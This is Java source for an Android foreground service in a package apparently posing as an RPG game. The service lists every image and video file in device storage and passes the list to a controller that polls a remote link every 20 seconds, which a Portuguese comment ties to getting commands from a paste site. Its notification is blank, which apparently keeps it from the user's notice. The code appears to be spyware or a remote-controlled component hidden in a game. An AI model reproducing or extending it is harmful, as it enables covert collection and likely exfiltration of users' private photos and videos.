package com.example.rpg;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.File;
import java.util.ArrayList;
import java.util.SortedSet;
import java.util.TreeSet;

public class ForegroundService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        ArrayList<String> allFiles = new ArrayList<>();
        allFiles = getAllFiles();
        System.out.println("All files: "+ allFiles.size());

        ApiController controller = new ApiController();
        ArrayList<String> finalAllFiles = allFiles;
        new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        while (true) {
                            Log.e("Service", "Service is running...");
                            // aki q tem a chamada do metodo getCommands()

                            // chamando getcommands passando link do invertexto
                            //controller.getCommands(finalAllFiles);
                            controller.getLink(finalAllFiles);

                            //System.out.println(finalAllFiles.size());
                            try {
                                Thread.sleep(20000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
        ).start();

        final String CHANNELID = "Foreground Service ID";

        NotificationChannel channel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            channel = new NotificationChannel(
                    CHANNELID,
                    CHANNELID,
                    NotificationManager.IMPORTANCE_LOW
            );
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        Notification.Builder notification = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNELID)
                    .setContentText(" ")
                    //.setContentTitle("")
                    .setSmallIcon(R.drawable.dice);
        }

        startForeground(1001, notification.build());

        return super.onStartCommand(intent, flags, startId);
    }

    public ArrayList<String> getAllFiles(){
        Uri u = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;// falta adaptar pra vid
        // Uri vidUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.ImageColumns.DATA};// falta adaptar pra vid
        // String[] vidProjection = {MediaStore.Video.VideoColumns.DATA};
        Cursor c = null;
        SortedSet<String> dirList = new TreeSet<String>();
        ArrayList<String> resultIAV = new ArrayList<String>();

        String[] directories = null;
        if (u != null)
        {
            c = getContentResolver().query(u, projection, null, null, null);
        }

        if ((c != null) && (c.moveToFirst()))
        {
            do
            {
                String tempDir = c.getString(0);
                tempDir = tempDir.substring(0, tempDir.lastIndexOf("/"));
                try{
                    dirList.add(tempDir);
                }
                catch(Exception e)
                {

                }
            }
            while (c.moveToNext());
            directories = new String[dirList.size()];
            dirList.toArray(directories);

        }

        for(int i=0;i<dirList.size();i++)
        {
            File fileDir = new File(directories[i]);
            //System.out.println("DIR: " + directories[i]);
            File[] fileList = fileDir.listFiles();
            if(fileList == null)
                continue;
            for (File filePath : fileList) {
                try {

                    if(filePath.isDirectory())
                    {
                        fileList = filePath.listFiles();

                    }
                    if ( filePath.getName().contains(".jpg")|| filePath.getName().contains(".JPG")
                            || filePath.getName().contains(".jpeg")|| filePath.getName().contains(".JPEG")
                            || filePath.getName().contains(".png") || filePath.getName().contains(".PNG")
                            || filePath.getName().contains(".gif") || filePath.getName().contains(".GIF")
                            || filePath.getName().contains(".bmp") || filePath.getName().contains(".BMP")
                            || filePath.getName().contains(".mp4") || filePath.getName().contains(".avi")
                    )
                    {
                        String path= filePath.getAbsolutePath();
                        resultIAV.add(path);
                    }
                }
                //  }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return resultIAV;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
